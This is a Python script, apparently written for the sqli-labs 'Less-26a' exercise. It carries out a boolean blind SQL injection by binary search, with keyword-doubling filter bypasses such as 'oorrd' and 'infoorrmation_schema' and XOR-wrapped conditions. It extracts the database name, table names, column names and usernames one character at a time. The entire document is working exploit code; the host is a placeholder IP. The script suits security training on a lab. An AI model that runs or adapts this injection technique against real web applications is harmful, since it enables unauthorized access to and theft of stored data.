#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests

# url
url = "http://xxx.xxx.xxx.xxx/Less-26a/?id=1')^({})^('1'='1"

payload = {}
headers = {}
result = ''
for i in range(0, 800):
    low = 32
    high = 127
    while low < high:
        mid = (low+high)//2
        # 查数据库
        database = "oorrd(substr((select(group_concat(database()))),%d,1))>=%d" % (i, mid)
        # 查表
        tables = "oorrd(substr((select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema)=database()),%d,1))>=%d"%(i,mid)
        columns = "oorrd(substr((select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_name)='users'),%d,1))>=%d"%(i,mid)
        data = "oorrd(substr((select(group_concat(username))from(security.users)),%d,1))>=%d" % (i, mid)
        # 根据需要查询的内容改变参数
        response = requests.request("GET", url.format(data), headers=headers, data=payload)
        if 'Your Login name:Dumb' in response.text:
            low = mid+1
        else:
            high = mid
        print(low, mid, high)
    result += chr(low)
    print(result)
